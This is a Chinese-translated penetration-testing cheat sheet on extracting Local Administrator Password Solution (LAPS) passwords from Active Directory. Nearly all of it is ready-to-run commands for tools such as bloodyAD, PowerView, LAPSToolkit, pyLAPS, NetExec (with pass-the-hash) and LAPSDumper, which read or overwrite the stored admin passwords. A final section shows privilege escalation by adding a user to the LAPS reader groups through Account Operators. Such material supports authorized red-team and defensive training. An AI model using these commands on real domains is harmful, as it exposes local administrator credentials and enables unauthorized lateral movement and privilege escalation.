# 密码 - LAPS

## 读取 LAPS 密码 (Reading LAPS Password)

> 使用 LAPS (Local Administrator Password Solution，本地管理员密码解决方案) 可以自动管理加入域的计算机上的本地管理员密码，从而使每台受管计算机上的密码各不相同、随机生成，并安全地存储在 Active Directory 基础设施中。

### 确定是否安装了 LAPS (Determine if LAPS is installed)

```ps1
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
```

### 提取 LAPS 密码 (Extract LAPS password)

> "ms-mcs-AdmPwd" 是一个“机密 (confidential)”计算机属性，用于存储明文 LAPS 密码。默认情况下，机密属性只能由 Domain Admins (域管理员) 查看，并且与其他属性不同，无法由 Authenticated Users (经过身份验证的用户) 访问。

- Windows/Linux:

    ```ps1
    bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
    ```

- 从 Windows (From Windows):

    - adsisearcher (Windows 8+ 上的原生二进制文件)

       ```powershell
       ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
       ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
       ```

    - [PowerTools/PowerView](https://github.com/PowerShellEmpire/PowerTools)

       ```powershell
       PS > Import-Module .\PowerView.ps1
       PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
       ```

    - [leoloobeek/LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

       ```powershell
       $ Get-LAPSComputers
       ComputerName                Password                                 Expiration         
       ------------                --------                                 ----------         
       example.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18

       $ Find-LAPSDelegatedGroups
       $ Find-AdmPwdExtendedRights
       ```

    - Powershell AdmPwd.PS

       ```powershell
       foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
       ```

- 从 Linux (From Linux):

    - 利用 [p0dalirius/pyLAPS](https://github.com/p0dalirius/pyLAPS) **读取 (read)** 和 **写入 (write)** LAPS 密码：

       ```bash
       # 读取所有计算机的密码
       ./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
       # 将随机密码写入特定的计算机
       ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1
       ```

    - [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec):

       ```bash
       netexec ldap 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
       ```

    - [n00py/LAPSDumper](https://github.com/n00py/LAPSDumper)

       ```bash
       python laps.py -u 'user' -p 'password' -d 'domain.local'
       python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local'
       ```

    - ldapsearch

      ```bash
      ldapsearch -x -h  -D "<bind user>" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd
      ```

### 授予 LAPS 访问权限 (Grant LAPS Access)

**"Account Operator"** 组的成员可以添加和修改所有非管理员用户和组。因为 **LAPS ADM** 和 **LAPS READ** 被认为是非管理员组，所以可以将某位用户添加到这些组中，从而读取 LAPS 管理员的密码。

```ps1
Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain "domain.local"
Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain "domain.local"
```

## 参考资料 (References)

- [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
